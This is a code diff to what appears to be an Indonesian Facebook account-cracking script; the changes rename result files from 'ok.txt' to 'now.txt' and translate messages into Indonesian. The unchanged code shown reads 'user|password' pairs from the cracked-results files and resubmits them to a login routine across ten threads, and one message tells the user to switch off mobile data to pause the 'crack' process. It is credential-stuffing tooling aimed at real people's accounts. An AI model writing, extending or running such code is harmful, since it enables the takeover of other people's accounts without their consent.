@@ -333,17 +333,17 @@ def mbfv2():
                    elif kentang == '6' or kentang =='06':
                          try:
                                  file1 = open("cp.txt").read()
-                                 file2 = open("ok.txt").read()
+                                 file2 = open("now.txt").read()
                                  a = file1 + file2
                                  final = a.strip().split("\n")
                                  final = set(final)
-                                 print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
+                                 print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] User sedang di check ")
                                  with ThreadPoolExecutor(max_workers=10) as ex:
                                          for user in final:
                                                  a = user.split("|")
                                                  ex.submit(login,(a[0]),(a[1]),(True))
                                  for x in result:
-                                         with open('ok.txt','a') as f:
+                                         with open('now.txt','a') as f:
                                                  f.write(x+'\n')
                                  for x in chek:
                                          with open('cp.txt','a') as f:
@@ -354,7 +354,7 @@ def mbfv2():
                          except FileNotFoundError:
                                  exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                    else:
-                         print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
+                         print("\n\n \033[00m[\033[91m😣\033[00m] Harus dipillih!")
                          milzu()
                    print()
                    lupo_lupo_milzu()
@@ -368,7 +368,7 @@ def mbfv2():
                    menu()
                    peak()
                    print('\033[96mSemua ID\x1b[1;91m :\033[94m ' + str(len(id)) + "\n\033[92m \n",end="")
-                   print('\n\033[93m [\033[1;92m+\033[93m] \033[96mhasil\033[92m Now\033[93m disimpan di \033[91m: \033[92mNow.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Checkpoint\033[92m disimpan di \033[91m: \033[92mcp.txt')
+                   print('\n\033[93m [\033[1;92m+\033[93m] \033[96mhasil\033[92m Now\033[93m disimpan di \033[91m: \033[92mnow.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Checkpoint\033[92m disimpan di \033[91m: \033[92mcp.txt')
                    print('\n [\x1b[1;91m▪\x1b[1;97m] \033[92mMatikan data seluler untuk menjeda proses crack')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
